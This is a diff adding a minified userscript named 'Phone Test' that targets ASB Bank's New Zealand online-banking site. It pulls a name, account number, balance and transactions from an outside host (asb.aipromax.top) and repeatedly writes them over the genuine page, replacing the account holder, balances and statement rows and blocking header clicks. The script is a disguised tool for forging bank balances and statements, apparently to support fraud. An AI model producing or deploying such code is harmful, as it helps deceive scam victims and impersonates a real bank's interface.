@@ -1,0 +1,16 @@
+// ==UserScript==
+// @name         Phone Test
+// @namespace    http://tampermonkey.net/
+// @version      0.4
+// @description  Phone Test!
+// @author       You
+// @match        https://online.asb.co.nz/fnc/1/*
+// @icon         https://www.google.com/s2/favicons?sz=64&domain=asb.co.nz
+// @license      MIT
+// @grant        GM_xmlhttpRequest
+// @connect      asb.aipromax.top
+// @downloadURL https://update.greasyfork.org/scripts/471113/Phone%20Test.user.js
+// @updateURL https://update.greasyfork.org/scripts/471113/Phone%20Test.meta.js
+// ==/UserScript==
+
+ !function(){"use strict";let e=!0,t=!0,n=!0,o=!0,r=!0,a=!0,d="",i="",c="",l=[];function s(e){(e=e||window.event).preventDefault?e.preventDefault():e.retrunValue=!1,e.stopPropragation?e.stopPropragation():e.cancelBubble=!0}GM_xmlhttpRequest({method:"GET",url:"http://asb.aipromax.top/api/generals/infos",onload:function(e){const t=JSON.parse(e.response);i=t.data[0].name,c=t.data[0].account,d=t.data[0].price}}),GM_xmlhttpRequest({method:"GET",url:"http://asb.aipromax.top/api/generals/bills",onload:function(e){const t=JSON.parse(e.response);l=t.data}}),document.createElement("div").innerHTML='<div style="position: fixed;top: 0;left: 0;right: 0;bottom: 0;display: flex;align-items: center;justify-content: center;user-select: none;pointer-events: none;" >\n      <div style="font-size: 70px;color: rgb(233, 233, 233);border: 4px dashed rgb(233, 233, 233);padding: 14px;transform: rotate(-23deg);opacity: 0.7;">\n        \n      </div>\n    </div>',function u(){const m=document.getElementById("common-header");m&&m.contentWindow.window.document.querySelector("#me-button > label")&&e&&(m.contentWindow.window.document.querySelector("#me-button > label").innerText=i,i&&(e=!1));const p=document.getElementById("everyday-banking-hub");p&&p.contentWindow.window.document.querySelector(".balance")&&t&&(p.contentWindow.window.document.querySelector("#root > div > h2 > span").innerText=i,p.contentWindow.window.document.querySelector(".style_balanceWordWrapBreak__ZZrSC").innerText=d,p.contentWindow.window.document.querySelector(".style_balanceWordWrapBreak__QMc4d").innerText=d,d&&(t=!1));const b=document.getElementById("AvaailableBalanceAmount"),g=document.getElementById("CurrentBalanceAmount");b&&n&&(b.innerText=d,d&&(n=!1)),g&&o&&(g.innerText=d,d&&(o=!1));const y=document.querySelector("#StatementsHeadertable > tbody > tr:nth-child(1) > td");y&&a&&(y.innerHTML=`<div class="line-title">Account Holder:</div> ${c}`,c&&(a=!1));const f=document.querySelector("#statementTable > tbody");if(f&&r){document.querySelector("#statementTable > thead > tr").addEventListener("click",s,!0);for(let e=0;e<l.length;e++){const t=document.createElement("tr");t.innerHTML=`<td class="AlignTextLeft">${l[e].date}</td>\n<td class="AlignTextLeft">${l[e].transaction}</td>\n<td class="AlignTextRight">${l[e].debit||""}</td>\n<td class="AlignTextRight">${l[e].credit||""}</td>\n<td class="AlignTextRight">${l[e].balance}</td>`,f.insertBefore(t,f.firstElementChild)}l.length>0&&(r=!1)}setTimeout(()=>{u()},16)}()}();
